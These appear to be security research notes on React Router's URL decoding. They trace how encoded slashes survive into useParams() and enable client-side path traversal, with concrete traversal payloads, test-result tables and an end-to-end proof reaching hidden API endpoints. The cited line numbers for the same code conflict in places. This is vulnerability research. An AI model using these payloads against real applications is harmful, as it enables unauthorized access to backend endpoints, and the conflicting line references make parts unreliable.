# 3. Encoding Behavior

## The React Router Decoding Pipeline

**Source:** `@remix-run/router v1.23.0` at `/node_modules/@remix-run/router/dist/router.js`

```
Browser URL
    |
    v
window.location.pathname (percent-encoded)
    |
    v
parsePath() [line 309-327] -- NO decoding, just splits path/search/hash
    |
    v
matchRoutesImpl() [line 523-543]
    |
    v
decodePath() [line 863-870] -- KEY: per-segment decodeURIComponent()
    |                            then re-encodes / back to %2F
    v
compilePath() [line 822-861] -- builds regex, :param = [^\\/]+, * = (.*)
    |
    v
matchPath() [line 782-821]
    |  LINE 811: .replace(/%2F/g, "/")  <-- UNDOES the re-encoding!
    v
params object (fully decoded, %2F = /)
    |
    v
useParams() returns decoded params
```

## `decodePath()` - The Defense That Gets Bypassed (line 863-870)

```javascript
function decodePath(value) {
  try {
    return value
      .split("/")                              // preserve structural /
      .map(v => decodeURIComponent(v)          // decode each segment
        .replace(/\//g, "%2F"))                // re-encode decoded / back to %2F
      .join("/");                              // rejoin
  } catch (error) {
    return value;  // fallback: return raw on malformed encoding
  }
}
```

This is an **anti-CSPT defense for route matching** - it prevents `%2F` from creating new path segments during regex matching. But `matchPath()` at line 811 **undoes it** for the extracted param values.

## `matchPath()` line 811 - The CSPT Primitive

```javascript
memo[paramName] = (value || "").replace(/%2F/g, "/");
```

After `decodePath()` carefully preserved `%2F`, this line converts it back to `/` in params. This affects ALL params including splats.

## Step-by-Step Decode Traces with Concrete Payloads

### Single-encoded: `..%2f..%2fadmin`

Attacker visits `https://app.com/files/..%2f..%2fadmin`:

| Step | Where | Input | Output | What happened |
|------|-------|-------|--------|---------------|
| 1 | Browser address bar → `location.pathname` | `/files/..%2f..%2fadmin` | `/files/..%2f..%2fadmin` | Browser preserves `%2F` in pathname (special case — `/` is a path delimiter) |
| 2 | `decodePath()` line 811 — `decodeURIComponent()` | `"..%2f..%2fadmin"` | `"../../admin"` | Decodes `%2f` → `/` |
| 3 | `decodePath()` line 811 — `.replace(/\//g, "%2F")` | `"../../admin"` | `"..%2F..%2Fadmin"` | Re-encodes slashes back (defense attempt) |
| 4 | `matchPath()` — regex captures | `"..%2F..%2Fadmin"` | `"..%2F..%2Fadmin"` | Regex `(.*)` grabs the segment as-is |
| 5 | `matchPath()` line 764 — `.replace(/%2F/g, "/")` | `"..%2F..%2Fadmin"` | `"../../admin"` | **Undoes the defense from step 3** |
| 6 | Developer's `fetch()` | `` fetch(`/api/files/${splat}`) `` | `GET /api/admin` | Browser resolves `../` before sending |

### Double-encoded: `..%252f..%252fadmin`

Attacker visits `https://app.com/files/..%252f..%252fadmin`:

| Step | Where | Input | Output | What happened |
|------|-------|-------|--------|---------------|
| 1 | Browser address bar → `location.pathname` | `/files/..%252f..%252fadmin` | `/files/..%252f..%252fadmin` | `%25` stays as `%25`, browser doesn't decode |
| 2 | `decodePath()` line 811 — `decodeURIComponent()` | `"..%252f..%252fadmin"` | `"..%2f..%2fadmin"` | First decode: `%252f` → `%2f` |
| 3 | `decodePath()` line 811 — `.replace(/\//g, "%2F")` | `"..%2f..%2fadmin"` | `"..%2f..%2fadmin"` | No literal `/` to re-encode (still encoded as `%2f`) |
| 4 | `matchPath()` — regex captures | `"..%2f..%2fadmin"` | `"..%2f..%2fadmin"` | Captured as-is |
| 5 | `matchPath()` line 764 — `.replace(/%2F/g, "/")` | `"..%2f..%2fadmin"` | `"..%2f..%2fadmin"` | **No match** — `%2F` is uppercase, captured value has lowercase `%2f` |

Wait — the `%2F` replace is case-sensitive. Let me check this is actually the case with uppercase double-encoding `%252F`:

| Step | Where | Input | Output |
|------|-------|-------|--------|
| 2 | `decodePath()` — `decodeURIComponent()` | `"..%252F..%252Fadmin"` | `"..%2F..%2Fadmin"` |
| 5 | line 764 — `.replace(/%2F/g, "/")` | `"..%2F..%2Fadmin"` | `"../../admin"` |

The case of the double-encoding matters: `%252F` (uppercase F) → `%2F` → `/` works. `%252f` (lowercase f) → `%2f` → stays as `%2f` because line 764 only matches uppercase `%2F`.

### The Three Decode Points

| Decode Point | Location | What it decodes |
|---|---|---|
| **Browser** | Address bar → `location.pathname` | Most percent-encoding except `%2F` (path delimiter) |
| **`decodePath()`** | line 811 `decodeURIComponent()` | Everything — `%252F` → `%2F`, `%2E` → `.`, etc. |
| **Line 764** | `.replace(/%2F/g, "/")` | Only uppercase `%2F` → `/` (case-sensitive!) |

## Empirical Encoding Test Results

Tested in Chrome with React Router v7 dev server. Each row = one browser navigation.

### Path Parameters (`:testParam`)

| URL Encoding | `useParams()` Value | `location.pathname` | Exploitable? |
|-------------|---------------------|---------------------|-------------|
| `hello` (baseline) | `hello` | `/encoding-test/hello` | - |
| `hello%2Fworld` | `hello/world` | preserves `%2F` | YES - slash injected |
| `%2E%2E%2Fapi%2Fadmin` | `../api/admin` | preserves encoding | YES - full traversal |
| `hello%252Fworld` | `hello/world` | preserves `%252F` | YES - DOUBLE DECODE |
| `hello%09world` | `hello\tworld` | preserves `%09` | YES - tab injected |
| `hello%00world` | `hello\0world` | preserves `%00` | YES - null byte passes through |
| `hello%23fragment` | `hello#fragment` | preserves `%23` | Decoded but not delimiter |
| `hello%3Fkey=val` | `hello?key=val` | preserves `%3F` | Decoded but not delimiter |
| `hello%5Cworld` | `hello\world` | preserves `%5C` | YES - backslash injected |

### Splat Parameters (`params["*"]`)

| URL | `params["*"]` | Notes |
|-----|---------------|-------|
| `/encoding-splat/%2E%2E%2Fapi%2Fadmin` | `../api/admin` | Same decoding as named params |
| `/encoding-splat/path/to/../../api/admin` | `api/admin` | Browser normalized `../` BEFORE React Router |

### Query Parameters (`searchParams.get()`)

| URL Query | `searchParams.get('q')` | Exploitable? |
|-----------|------------------------|-------------|
| `?q=%2E%2E%2Fapi%2Fadmin` | `../api/admin` | YES - single decode |
| `?q=%252E%252E%252F` | `%2E%2E%2F` | NO - only single decode |

## Critical Encoding Insights

1. **Path params double-decode**: `%252F` → `%2F` (decodeURIComponent) → `/` (line 811). Query params only single-decode.

2. **The double-decode path**: `decodePath()` calls `decodeURIComponent("%252F")` → `"%2F"`, then `matchPath()` line 811 calls `.replace(/%2F/g, "/")` → `"/"`. This is NOT two calls to decodeURIComponent - it's decode + string replace.

3. **Null bytes pass through**: `%00` → `\0` in params. No stripping. Potential for null byte injection on backends that handle C strings.

4. **Browser normalizes unencoded `../`**: If you put literal `../../` in the URL, the browser resolves it before React Router sees it. CSPT requires **encoded** traversal to bypass browser normalization.

5. **`useLocation().pathname` is the safe alternative**: It preserves encoding. Devs who use `location.pathname` for API calls are safe from CSPT (but almost nobody does this).

## End-to-End CSPT Proof

```
URL:     /users/%2E%2E%2Fapi%2Fadmin

Step 1:  React Router decodes useParams().userId = "../api/admin"
Step 2:  Component executes: fetch(`/api/users/${userId}`)
         = fetch("/api/users/../api/admin")
Step 3:  Browser normalizes ../: GET /api/api/admin

With correct depth: /users/%2E%2E%2F%2E%2E%2Fsecret-endpoint
         userId = "../../secret-endpoint"
         fetch("/api/users/../../secret-endpoint")
         Browser: GET /secret-endpoint
```
